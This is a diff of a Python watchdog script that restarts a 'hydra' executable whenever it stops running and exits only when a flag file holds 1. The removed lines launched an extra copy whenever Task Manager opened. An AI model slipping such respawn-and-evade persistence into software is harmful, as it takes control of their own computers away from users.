@@ -7,12 +7,7 @@ path = os.getcwd()
 firsttime = True
 
 text_path = os.path.join(path, 'variable.txt')
-hydra_path = os.path.join(path, 'hydra.py')
-
-def check_taskmgr():
-    for p in psutil.process_iter(['name']):
-        if 'taskmgr' in p.info['name'].lower():
-            subprocess.Popen(["python", hydra_path])
+hydra_path = os.path.join(path, 'hydra.exe')
 
 def find_or_start_process(process_name):
     global firsttime
@@ -26,12 +21,12 @@ def find_or_start_process(process_name):
                 break
     
     if process is None:
-        process = subprocess.Popen(["python", hydra_path])
+        process = subprocess.Popen([hydra_path])
     
     firsttime = False
     return process
 
-process_name = "python.exe"
+process_name = "hydra.exe"
 process = find_or_start_process(process_name)
 
 while True:
@@ -43,10 +38,12 @@ while True:
             pass
         else:
             process = find_or_start_process(process_name)
-    check_taskmgr()
         
     with open(text_path, "r") as f:
-        data = int(f.read())
+        try:
+            data = int(f.read())
+        except ValueError:
+            data = 2
         f.close()
     if data == 1:
         sys.exit()
